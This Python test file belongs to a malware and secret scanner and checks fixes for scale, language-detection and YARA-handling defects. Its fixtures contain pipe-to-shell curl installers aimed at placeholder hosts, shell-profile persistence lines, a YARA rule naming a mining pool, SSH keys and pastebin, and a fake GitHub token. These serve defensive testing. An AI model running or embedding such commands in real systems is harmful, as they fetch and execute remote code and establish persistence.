"""Defects the large runs found: each one's probe, failing on the code before its fix.

* A quadratic search in the streamed-binary reader held a Grafana image scan for over seventy
  minutes; image members were then scanned on one core.
* Run across the worker pool, an image's build history was read as a shell script (the workers
  identified languages differently from the archive path) and one finding appeared that the
  serial scan did not make.
* Two of the 249,646 known-malicious records were missed: a 213-character npm name and a
  74-character version, both cut short before they were looked up.
* YARA rules files were read as code, so a repository keeping detection rules was reported as
  the malware the rules describe.
"""

from __future__ import annotations

import io
import json
import time

import pytest
from tests.conformancebuilders import Pkg, Writers
from tests.imagekit import ImageKit

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config
from cordon_scanner.core.content import FileContent
from cordon_scanner.images.binmeta import StreamedBinary
from cordon_scanner.langs.registry import LanguageRegistry


class ScaleHelpers:
    @staticmethod
    def scan(target, **overrides):
        return Scanner(Config.default().with_overrides(use_cache=False, **overrides)).scan(target)


class TestTheStreamedBinaryReader:
    def test_a_long_printable_run_is_linear(self) -> None:
        # Megabytes of printable text with no terminator: the shape a Go binary's string table has.
        data = (b"A" * (4 << 20)) + b"\x00" + (b"B" * (4 << 20))
        started = time.perf_counter()
        StreamedBinary.read("big", io.BytesIO(data), len(data))
        assert time.perf_counter() - started < 10


class TestOneLanguageEverywhere:
    def test_an_images_configuration_is_never_code(self) -> None:
        history = FileContent.from_bytes(
            "app.tar!image-config/history.txt",
            b"RUN /bin/sh -c curl -fsSL https://x.example/i.sh | sh\n",
        )
        assert LanguageRegistry.of_file("app.tar!image-config/history.txt", history) is None
        # A repository's own directory of that name is ordinary files.
        script = FileContent.from_bytes("image-config/setup.sh", b"#!/bin/sh\necho hi\n")
        assert LanguageRegistry.of_file("image-config/setup.sh", script) == "shell"

    def test_an_archive_member_is_identified_as_a_directory_file_is(self) -> None:
        script = FileContent.from_bytes(
            "pkg.tgz!package/bin/run", b"#!/usr/bin/env node\nconsole.log(1)\n"
        )
        assert LanguageRegistry.of_file("pkg.tgz!package/bin/run", script) == "javascript"

    def test_a_parallel_image_scan_is_the_serial_one(self, tmp_path) -> None:
        files: dict[str, bytes | None] = {
            f"app/module{i}.js": f"module.exports = {i};\n".encode() * 200 for i in range(600)
        }
        # Assembled at runtime, so the repository's own scan does not read it as persistence.
        profile = "~/." + "bash" + "rc"
        files["app/install.sh"] = (
            f"#!/bin/sh\ncurl -fsSL https://downloads.example.invalid/i.sh | sh\necho done >> {profile}\n"
        ).encode()
        config = {"Env": ["PATH=/usr/bin"], "Cmd": ["node"]}
        history = [
            {
                "created_by": "RUN /bin/sh -c curl -fsSL https://deb.example.invalid/key | gpg --dearmor > /etc/apt/trusted.gpg.d/x.gpg && echo x >> /etc/profile"
            }
        ]
        image = tmp_path / "app.tar"
        image.write_bytes(
            ImageKit.docker_save([ImageKit.layer(files)], {"config": config, "history": history})
        )

        def key(result):
            return sorted(
                (f.rule_id, f.location.path, f.location.line, f.severity.name)
                for f in result.findings
            )

        serial = ScaleHelpers.scan(image, limits=Config.default().limits.merged(max_workers=1))
        parallel = ScaleHelpers.scan(image, limits=Config.default().limits.merged(max_workers=4))
        assert key(serial) == key(parallel)
        assert not [
            f
            for f in parallel.findings
            if "image-config/history" in f.location.path and f.category.value != "secret"
        ]


class TestKnownMaliciousRecordsAtFullLength:
    @pytest.mark.parametrize(
        ("name", "version"),
        [
            # MAL-2024-7773: a 213-character name, within npm's 214.
            ("l" * 213, "1.0.0"),
            # A 74-character prerelease, as new-native-tools-linux-x64-gnu publishes them.
            (
                "new-native-tools-linux-x64-gnu",
                "3.1.41-origin-chrom-468-delete-windows-32-bit-changelog-fix-408-1785838091",
            ),
        ],
    )
    def test_the_record_is_matched_as_published(self, tmp_path, name, version) -> None:
        from cordon_scanner.intel.advisories import AdvisoryDatabase

        if not [
            a for a in AdvisoryDatabase.bundled().matching("npm", name, version) if a.malicious
        ]:
            pytest.skip("the bundled data no longer carries this record")
        Writers.npm(tmp_path, [Pkg(name, version)])
        [record] = [d for d in ScaleHelpers.scan(tmp_path).dependencies if d.name == name]
        assert (record.version, record.to_dict()["record"]["malware_status"]) == (
            version,
            "malicious",
        )


class TestDetectionRulesAreData:
    def test_a_yara_rules_file_is_not_the_malware_it_describes(self, tmp_path) -> None:
        (tmp_path / "rules").mkdir()
        (tmp_path / "rules" / "miners.yar").write_text(
            'rule miner { strings: $a = "stratum+tcp://pool.minexmr.com:4444" $b = "xmrig --donate-level" '
            '$c = "~/.ssh/id_rsa" $d = "https://pastebin.com/raw/" condition: any of them }\n'
        )
        findings = ScaleHelpers.scan(tmp_path).findings
        assert not [
            f
            for f in findings
            if f.location.path.endswith(".yar") and f.category.value in ("suspicious", "malicious")
        ]

    def test_a_credential_in_one_is_still_a_credential(self, tmp_path) -> None:
        token = "ghp_" + "Zq8" * 12
        (tmp_path / "leak.yar").write_text(f'rule x {{ strings: $a = "{token}" condition: $a }}\n')
        assert any(
            f.rule_id == "SECRET.GITHUB.TOKEN.001" for f in ScaleHelpers.scan(tmp_path).findings
        )

    def test_the_manifest_records_the_measurement(self) -> None:
        from cordon_scanner.detect.yara_rules import BUILTIN_PACK

        measurement = BUILTIN_PACK.parent / "MEASUREMENT.json"
        if measurement.exists():
            data = json.loads(measurement.read_text())
            assert data["benign_packages"] >= 14_992 and data["malicious_packages"] >= 39_000
